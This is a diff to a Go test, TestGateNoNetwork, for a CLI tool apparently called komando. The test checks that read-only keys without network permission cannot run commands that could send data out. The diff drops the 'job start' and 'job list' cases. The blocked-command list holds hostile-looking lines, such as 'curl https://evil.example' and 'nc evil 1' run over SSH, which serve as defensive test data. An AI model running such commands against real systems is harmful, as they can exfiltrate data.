@@ -37,8 +37,8 @@ var (
 
 // A read key added without --network runs only komando's own reads of
 // targets in the inventory: nothing that dials a place the key names (cert
-// check of a URL), and no program of the key's choosing (exec, job
-// start, docker exec, cluster kubernetes exec, snippet exec), which could send rows out
+// check of a URL), and no program of the key's choosing (exec,
+// docker exec, cluster kubernetes exec, snippet exec), which could send rows out
 // in a URL or a DNS name.
 func TestGateNoNetwork(t *testing.T) {
 	invHome(t)
@@ -49,7 +49,7 @@ func TestGateNoNetwork(t *testing.T) {
 		"cert check https://evil.example", "cert check web https://evil.example/x", "cert check smtps://evil.example",
 		"host ssh exec web --read-only -- curl https://evil.example", "host ssh exec web --read-only -- uptime",
 		"host ssh exec web --read-only --script -", "host ssh exec web --read-only --cmd 'nc evil 1'",
-		"job start web --read-only -- du -sh /var", "docker exec web app --read-only -- ls",
+		"docker exec web app --read-only -- ls",
 		"cluster kubernetes exec k8s pod/x --read-only -- ls", "snippet exec my-df web", "snippet exec disk web",
 		"-o json host ssh exec web --read-only -- curl https://evil.example", "--dry-run host ssh exec web --read-only -- uptime",
 	}
@@ -77,7 +77,7 @@ func TestGateNoNetwork(t *testing.T) {
 		"docker logs web app", "database postgres query pg 'select 1'", "db schema pg", "db activity pg", "cache get c a", "cache redis raw c GET a",
 		"cache info c", "cluster kubernetes raw k8s get pods", "cluster status k8s", "cluster logs k8s api-1", "cert check web",
 		"cert check web --path /etc/ssl/site.pem", "pkg security web", "pkg installed web", "copy s3:a.txt -",
-		"storage s3 object list s3", "job list", "audit list", "export", "conn test pg", "vpn socks list",
+		"storage s3 object list s3", "audit list", "export", "conn test pg", "vpn socks list",
 		"host ssh exec --help", "cluster info k8s", "registry oci image list reg",
 		"group show web", "group list", "snippet show disk", "snippet list", // a read key keeps the reads of groups and snippets
 	}
